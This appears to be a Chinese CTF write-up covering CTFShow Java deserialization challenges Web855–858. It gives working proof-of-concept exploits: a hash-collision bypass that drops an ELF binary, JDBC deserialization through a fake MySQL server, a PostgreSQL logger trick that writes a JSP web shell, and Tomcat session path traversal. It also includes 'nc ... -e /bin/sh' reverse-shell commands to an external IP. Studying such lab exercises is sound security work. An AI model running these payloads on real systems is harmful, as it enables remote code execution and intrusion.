# CTFShow-Java反序列化篇(2)

  
  
&lt;!--more--&gt;  
## Web855  
```java  
import java.io.*;  
   
public class User implements Serializable {  
    private static final long serialVersionUID = 0x36d;  
    private String username;  
    private String password;  
   
    public User(String username, String password) {  
        this.username = username;  
        this.password = password;  
    }  
   
    public String getUsername() {  
        return username;  
    }  
   
    public void setUsername(String username) {  
        this.username = username;  
    }  
   
    public String getPassword() {  
        return password;  
    }  
   
    public void setPassword(String password) {  
        this.password = password;  
    }  
   
   
    private static final String OBJECTNAME=&#34;ctfshow&#34;;  
    private static final String SECRET=&#34;123456&#34;;  
   
    private static  String shellCode=&#34;chmod &#43;x ./&#34;&#43;OBJECTNAME&#43;&#34; &amp;&amp; ./&#34;&#43;OBJECTNAME;  
   
   
   
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        int magic = in.readInt();  
        if(magic==2135247942){  
            byte var1 = in.readByte();  
   
            switch (var1){  
                case 1:{  
                    int var2 = in.readInt();  
                    if(var2==0x36d){  
   
                        FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME);  
                        fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46});  
                        byte[] temp = new byte[1];  
                        while((in.read(temp))!=-1){  
                            fileOutputStream.write(temp);  
                        }  
   
                        fileOutputStream.close();  
                        in.close();  
   
                    }  
                    break;  
                }  
                case 2:{  
   
                    ObjectInputStream.GetField gf = in.readFields();  
                    String username = (String) gf.get(&#34;username&#34;, null);  
                    String password = (String) gf.get(&#34;password&#34;,null);  
                    username = username.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)  
                            .replaceAll(&#34; {2,}&#34;, &#34; &#34;);  
                    password = password.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)  
                            .replaceAll(&#34; {2,}&#34;, &#34; &#34;);  
                    User var3 = new User(username,password);  
                    User admin = new User(OBJECTNAME,SECRET);  
                    if(var3 instanceof  User){  
                        if(OBJECTNAME.equals(var3.getUsername())){  
                            throw  new RuntimeException(&#34;object unserialize error&#34;);  
                        }  
                        if(SECRET.equals(var3.getPassword())){  
                            throw  new RuntimeException(&#34;object unserialize error&#34;);  
                        }  
                        if(var3.equals(admin)){  
                            Runtime.getRuntime().exec(shellCode);  
                        }  
                    }else{  
                        throw  new RuntimeException(&#34;object unserialize error&#34;);  
                    }  
                    break;  
                }  
                default:{  
                    throw  new RuntimeException(&#34;object unserialize error&#34;);  
                }  
            }  
        }  
   
    }  
   
    @Override  
    public boolean equals(Object o) {  
        if (this == o) return true;  
        if (!(o instanceof User)) return false;  
        User user = (User) o;  
        return this.hashCode() == user.hashCode();  
    }  
   
    @Override  
    public int hashCode() {  
        return username.hashCode()&#43;password.hashCode();  
    }  
   
   
}  
```  
来审计一下代码  
`User`类继承了`Serializable`接口，说明可以被序列化  
```java  
public class User implements Serializable  
```  
定义了三个静态变量无法被改变  
```java  
private static final String OBJECTNAME=&#34;ctfshow&#34;;    
private static final String SECRET=&#34;123456&#34;;  
private static  String shellCode=&#34;chmod &#43;x ./&#34;&#43;OBJECTNAME&#43;&#34; &amp;&amp; ./&#34;&#43;OBJECTNAME;  
```  
并重写了`equals()`和`hashCode()`方法  
```java  
@Override  
public boolean equals(Object o) {    
    if (this == o) return true;    
    if (!(o instanceof User)) return false;    
    User user = (User) o;    
    return this.hashCode() == user.hashCode();    
}    
    
@Override    
public int hashCode() {    
    return username.hashCode()&#43;password.hashCode();    
}  
```  
接下来最后看反序列化入口点`readObject()`方法  
```java  
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {    
    int magic = in.readInt();    
    if(magic==2135247942){    
        byte var1 = in.readByte();    
    
        switch (var1){    
            case 1:{    
                int var2 = in.readInt();    
                if(var2==0x36d){    
    
                    FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME);    
                    fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46});    
                    byte[] temp = new byte[1];    
                    while((in.read(temp))!=-1){    
                        fileOutputStream.write(temp);    
                    }    
    
                    fileOutputStream.close();    
                    in.close();    
    
                }    
                break;    
            }    
            case 2:{    
    
                ObjectInputStream.GetField gf = in.readFields();    
                String username = (String) gf.get(&#34;username&#34;, null);    
                String password = (String) gf.get(&#34;password&#34;,null);    
                username = username.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)    
                        .replaceAll(&#34; {2,}&#34;, &#34; &#34;);    
                password = password.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)    
                        .replaceAll(&#34; {2,}&#34;, &#34; &#34;);    
                User var3 = new User(username,password);    
                User admin = new User(OBJECTNAME,SECRET);    
                if(var3 instanceof  User){    
                    if(OBJECTNAME.equals(var3.getUsername())){    
                        throw  new RuntimeException(&#34;object unserialize error&#34;);    
                    }    
                    if(SECRET.equals(var3.getPassword())){    
                        throw  new RuntimeException(&#34;object unserialize error&#34;);    
                    }    
                    if(var3.equals(admin)){    
                        Runtime.getRuntime().exec(shellCode);    
                    }    
                }else{    
                    throw  new RuntimeException(&#34;object unserialize error&#34;);    
                }    
                break;    
            }    
            default:{    
                throw  new RuntimeException(&#34;object unserialize error&#34;);    
            }    
        }    
    }    
    
}  
```  
有两个点，第一个点会写入一个文件，并且开头是`0x7f,0x45,0x4c,0x46`，这是`elf`文件的开头  
```java  
case 1:{    
    int var2 = in.readInt();    
    if(var2==0x36d){    
    
        FileOutputStream fileOutputStream = new FileOutputStream(OBJECTNAME);    
        fileOutputStream.write(new byte[]{0x7f,0x45,0x4c,0x46});    
        byte[] temp = new byte[1];    
        while((in.read(temp))!=-1){    
            fileOutputStream.write(temp);    
        }    
    
        fileOutputStream.close();    
        in.close();    
    
    }    
    break;    
}  
```  
第二个点，绕过`if`条件，会执行`shellcode`这个变量  
```java  
case 2:{    
    
    ObjectInputStream.GetField gf = in.readFields();    
    String username = (String) gf.get(&#34;username&#34;, null);    
    String password = (String) gf.get(&#34;password&#34;,null);    
    username = username.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)    
            .replaceAll(&#34; {2,}&#34;, &#34; &#34;);    
    password = password.replaceAll(&#34;[\\p{C}\\p{So}\uFE00-\uFE0F\\x{E0100}-\\x{E01EF}]&#43;&#34;, &#34;&#34;)    
            .replaceAll(&#34; {2,}&#34;, &#34; &#34;);    
    User var3 = new User(username,password);    
    User admin = new User(OBJECTNAME,SECRET);    
    if(var3 instanceof  User){    
        if(OBJECTNAME.equals(var3.getUsername())){    
            throw  new RuntimeException(&#34;object unserialize error&#34;);    
        }    
        if(SECRET.equals(var3.getPassword())){    
            throw  new RuntimeException(&#34;object unserialize error&#34;);    
        }    
        if(var3.equals(admin)){    
            Runtime.getRuntime().exec(shellCode);    
        }    
    }else{    
        throw  new RuntimeException(&#34;object unserialize error&#34;);    
    }    
    break;    
}  
```  
`shellcode`  
`private static  String shellCode=&#34;chmod &#43;x ./&#34;&#43;OBJECTNAME&#43;&#34; &amp;&amp; ./&#34;&#43;OBJECTNAME;`  
会赋予`ctfshow`这个文件执行权限，并且执行  
现在的思路就是写入一个`elf`文件，并且执行  
构造poc  
本地写一个`c`文件程序  
```c  
#include&lt;stdlib.h&gt;    
 int main() {    
    system(&#34;nc ip port -e /bin/sh&#34;);    
    return 0;    
}  
```  
编译一下`gcc shellcode.c -o shellcode`  
接着再把前四个字节删掉  
利用反序列化写入，在此之前，还有几个`if`条件需要绕过  
```java  
if(var3 instanceof  User){    
	if(OBJECTNAME.equals(var3.getUsername())){    
		throw  new RuntimeException(&#34;object unserialize error&#34;);    
	}    
	if(SECRET.equals(var3.getPassword())){    
		throw  new RuntimeException(&#34;object unserialize error&#34;);    
	}    
	if(var3.equals(admin)){    
		Runtime.getRuntime().exec(shellCode);    
```  
实例化传入的`username`和`password`不能是`ctfshow`和`123456`，但是`hash`比较的时候又相等。  
这个时候需要用到`Java`里的`hash`碰撞  
```java  
def hashcode(val):  
    h=0  
    for i in range(len(val)):  
        h=31 * h &#43; ord(val[i])  
    return h   
t=&#34;ct&#34;  
#t=&#34;12&#34;  
for k in range(1,128):  
    for l in range(1,128):  
        if t!=(chr(k)&#43;chr(l)):  
            if(hashcode(t)==hashcode(chr(k)&#43;chr(l))):  
                print(t,chr(k)&#43;chr(l))  
  
```  
得到  
`ct,dU 12,0Q`  
构造完整的`Poc`  
```java  
package com.ctfshow;    
    
import com.ctfshow.entity.User;    
    
import java.io.*;    
import java.util.Base64;    
    
public class Vuln {    
    public static void main(String[] args) throws Exception{    
        User user = new User(&#34;dUfshow&#34;,&#34;0Qahua&#34;);    
    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream oos = new ObjectOutputStream(baos);    
        oos.writeObject(user);    
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());    
        System.out.println(payload);    
    }   
}  
```  
重写的writeObject  
```java  
private void writeObject(ObjectOutputStream out) throws Exception{    
    out.writeInt(2135247942);  
    out.writeByte(1); //执行RCE的时候，将这里改成2下面注释掉即可  
	///////////////////////////  
    out.writeInt(0x36d);    
    File filename = new File(&#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/JavaThings/VulnDemo/src/main/java/org/example/bash&#34;);    
    BufferedInputStream in = new BufferedInputStream(new FileInputStream(filename));  
    byte[] temp = new byte[1024];  
    int size = 0;    
    while((size = in.read(temp)) != -1){    
        out.write(temp,0,size);    
    }    
    in.close();      
    /////////////////////////  
    out.defaultWriteObject();    
}  
```  
## Web856  
考察`jdbc`反序列化  
```java  
package com.ctfshow.entity;  
   
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.Serializable;  
import java.sql.DriverManager;  
import java.sql.SQLException;  
import java.util.Objects;  
   
public class Connection implements Serializable {  
   
    private static final long serialVersionUID = 2807147458202078901L;  
   
    private String driver;  
   
    private String schema;  
    private String host;  
    private int port;  
    private User user;  
    private String database;  
   
    public String getDriver() {  
        return driver;  
    }  
   
    public void setDriver(String driver) {  
        this.driver = driver;  
    }  
   
    public String getSchema() {  
        return schema;  
    }  
   
    public void setSchema(String schema) {  
        this.schema = schema;  
    }  
   
    public void setPort(int port) {  
        this.port = port;  
    }  
   
    public String getHost() {  
        return host;  
    }  
   
    public void setHost(String host) {  
        this.host = host;  
    }  
   
   
    public User getUser() {  
        return user;  
    }  
   
    public void setUser(User user) {  
        this.user = user;  
    }  
   
    public String getDatabase() {  
        return database;  
    }  
   
    public void setDatabase(String database) {  
        this.database = database;  
    }  
   
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException {  
        Class.forName(&#34;com.mysql.jdbc.Driver&#34;);  
        ObjectInputStream.GetField gf = in.readFields();  
        String host = (String) gf.get(&#34;host&#34;, &#34;127.0.0.1&#34;);  
        int port = (int) gf.get(&#34;port&#34;,3306);  
        User user = (User) gf.get(&#34;user&#34;,new User(&#34;root&#34;,&#34;root&#34;));  
        String database = (String) gf.get(&#34;database&#34;, &#34;ctfshow&#34;);  
        String schema = (String) gf.get(&#34;schema&#34;, &#34;jdbc:mysql&#34;);  
        DriverManager.getConnection( schema&#43;&#34;://&#34;&#43;host&#43;&#34;:&#34;&#43;port&#43;&#34;/?&#34;&#43;database&#43;&#34;&amp;user=&#34;&#43;user.getUsername());  
    }  
   
    @Override  
    public boolean equals(Object o) {  
        if (this == o) return true;  
        if (!(o instanceof Connection)) return false;  
        Connection that = (Connection) o;  
        return Objects.equals(host, that.host) &amp;&amp; Objects.equals(port, that.port) &amp;&amp; Objects.equals(user, that.user) &amp;&amp; Objects.equals(database, that.database);  
    }  
   
    @Override  
    public int hashCode() {  
        return Objects.hash(host, port, user, database);  
    }  
}```  
漏洞出现在这里  
```java  
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, SQLException {  
        Class.forName(&#34;com.mysql.jdbc.Driver&#34;);  
        ObjectInputStream.GetField gf = in.readFields();  
        String host = (String) gf.get(&#34;host&#34;, &#34;127.0.0.1&#34;);  
        int port = (int) gf.get(&#34;port&#34;,3306);  
        User user = (User) gf.get(&#34;user&#34;,new User(&#34;root&#34;,&#34;root&#34;));  
        String database = (String) gf.get(&#34;database&#34;, &#34;ctfshow&#34;);  
        String schema = (String) gf.get(&#34;schema&#34;, &#34;jdbc:mysql&#34;);  
        DriverManager.getConnection( schema&#43;&#34;://&#34;&#43;host&#43;&#34;:&#34;&#43;port&#43;&#34;/?&#34;&#43;database&#43;&#34;&amp;user=&#34;&#43;user.getUsername());  
    }  
```  
直接进行 JDBC 反序列化  
利用工具 https://github.com/fnmsd/MySQL_Fake_Server  
```java  
package com.ctfshow;    
    
import com.ctfshow.entity.Connection;    
import com.ctfshow.entity.User;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.Base64;    
    
public class Vuln{    
    public static void main(String[] args) throws Exception{    
        Connection connection = new Connection();    
        setFieldValue(connection,&#34;host&#34;,&#34;124.220.215.8&#34;); //vps 地址    
        setFieldValue(connection,&#34;port&#34;,3300); //vps端口    
        setFieldValue(connection,&#34;user&#34;,new User(&#34;huahua&#34;,&#34;1&#34;));    
        setFieldValue(connection,&#34;schema&#34;,&#34;jdbc:mysql&#34;);    
        setFieldValue(connection,&#34;database&#34;,&#34;detectCustomCollations=true&amp;autoDeserialize=true&#34;);    
    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream ois = new ObjectOutputStream(baos);    
        ois.writeObject(connection);    
    
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());    
        System.out.println(payload);    
    }    
    
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {    
        Field field = obj.getClass().getDeclaredField(fieldName);    
        field.setAccessible(true);    
        field.set(obj, value);    
    }    
    
}  
```  
### Reference  
https://tttang.com/archive/1877/#toc_2serverstatusdiffinterceptor  
https://xz.aliyun.com/t/8159  
## Web857  
- javax.servlet-api 4.0.1  
- mysql-connector-java 5.1.39  
- postgresql 42.3.1  
其中postgresql 42.3.1存在漏洞  
https://forum.butian.net/share/1339  
构造`Poc`  
```java  
package com.ctfshow;    
    
import com.ctfshow.entity.Connection;    
import com.ctfshow.entity.User;    
    
import java.io.*;    
import java.lang.reflect.Field;    
import java.util.Base64;    
    
public class Vuln{    
    public static void main(String[] args) throws Exception{    
        Connection connection = new Connection();    
        setFieldValue(connection,&#34;driver&#34;,&#34;org.postgresql.Driver&#34;);    
        setFieldValue(connection,&#34;host&#34;,&#34;124.220.215.8&#34;); //vps 地址    
        setFieldValue(connection,&#34;port&#34;,3300); //vps端口    
        setFieldValue(connection,&#34;user&#34;,new User(&#34;huahua&#34;,&#34;1&#34;));    
        setFieldValue(connection,&#34;schema&#34;,&#34;jdbc:postgresql&#34;);    
        setFieldValue(connection,&#34;database&#34;,&#34;loggerLevel=DEBUG&amp;loggerFile=../webapps/ROOT/hack.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(\&#34;huahua\&#34;));%&gt;&#34;);    
    
        ByteArrayOutputStream baos = new ByteArrayOutputStream();    
        ObjectOutputStream ois = new ObjectOutputStream(baos);    
        ois.writeObject(connection);    
    
        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());    
        System.out.println(payload);    
    }    
    
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {    
        Field field = obj.getClass().getDeclaredField(fieldName);    
        field.setAccessible(true);    
        field.set(obj, value);    
    }    
    
}  
```  
写入后，访问`/hack.jsp`  
传入`huahua=nc 124.220.215.8 1234 -e /bin/sh`  
## Web858  
`tomcat的session反序列化`  
https://www.freebuf.com/articles/web/242782.html  
`User`类中存在`readObject`的点，并且存在`RCE`  
```java  
package com.ctfshow.entity;  
   
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.Serializable;  
   
public class User implements Serializable {  
    private static final long serialVersionUID = -3254536114659397781L;  
    private String username;  
    private String password;  
   
    public String getUsername() {  
        return username;  
    }  
   
    public void setUsername(String username) {  
        this.username = username;  
    }  
   
    public String getPassword() {  
        return password;  
    }  
   
    public void setPassword(String password) {  
        this.password = password;  
    }  
   
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        Runtime.getRuntime().exec(this.username);  
    }  
   
   
}  
```  
根据上面的复现文章，尝试打一下  
构造`Poc`  
```java  
package com.ctfshow;    
    
import com.ctfshow.entity.User;    
    
import java.io.FileNotFoundException;    
import java.io.FileOutputStream;    
import java.io.IOException;    
import java.io.ObjectOutputStream;    
import java.lang.reflect.Field;    
    
public class Vuln1 {    
    public static void main(String[] args) throws Exception {    
        User user = new User();    
        Field username = user.getClass().getDeclaredField(&#34;username&#34;);    
        username.setAccessible(true);    
        username.set(user,&#34;cp /flag /usr/local/tomcat/webapps/ROOT/flag.txt&#34;);    
    
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;test.session&#34;));    
        oos.writeObject(user);    
    }    
    
}  
```  
上传文件后，得到目录  
`/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/huahua`  
利用`curl`请求，再触发一下  
```bash  
curl &#39;http://fdff0a06-5233-4da3-94ab-f6b39075f072.challenge.ctf.show/&#39; -H &#34;Cookie: JSESSIONID=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/test&#34;  
```  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%872/  

